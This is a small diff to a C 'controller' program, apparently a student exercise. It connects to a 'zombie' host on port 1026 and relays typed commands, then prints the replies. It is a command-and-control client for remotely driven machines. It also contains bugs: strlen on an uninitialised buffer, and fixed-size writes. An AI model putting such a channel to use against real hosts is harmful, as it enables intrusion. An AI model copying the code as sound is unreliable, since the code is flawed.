@@ -20,7 +20,8 @@ void executeCommands();
 int main(int argc, char **argv) {
 
   if (argc != 2) {
-    perror("Must give a name or IP adress in argument\n");
+    perror("Must give a name or IP adress in argument \n");
+    exit(EXIT_FAILURE);
   }
 
   // int tabSockets[argc - 1];
@@ -34,17 +35,22 @@ int main(int argc, char **argv) {
   //   tabSockets[i] = initSocketClient(tab_ip_address[i],
   //   TAB_PORTS[randomInt]);
   // }
-  printf("Le controller se connecte avec le zombie\n");
+  printf("Le controller se connecte avec le zombie...\n");
   char tab_ip_address[18];
   hostname_to_ip(argv[1], tab_ip_address);
-  int sockfd = initSocketClient(tab_ip_address, SERVER_PORT);
+  int sockfd = initSocketClient(tab_ip_address, 1026);
+  printf("Le controller est connecté \n");
 
   char buffer[SIZE_MESSAGE];
+  char response[SIZE_MESSAGE];
   int nbRd;
-  while ((nbRd = sread(1, buffer, SIZE_MESSAGE)) != 0) {
-    buffer[nbRd - 1] = '\0';
 
-    swrite(sockfd, buffer, strlen(buffer)); // rajouter +1 ??
+ // printf("Entrez votre commande: ");
+  while ((nbRd = sread(0, buffer, SIZE_MESSAGE)) != 0) {
+    buffer[nbRd - 1] = '\0';
+    swrite(sockfd, buffer, nbRd); // rajouter +1 ??
+    nbRd = sread(sockfd, response, strlen(response));
+    swrite(1, response, SIZE_MESSAGE);
   }
 }
 
@@ -53,16 +59,3 @@ int initSocketClient(char *serverIP, int serverPort) {
   sconnect(serverIP, serverPort, sockfd);
   return sockfd;
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
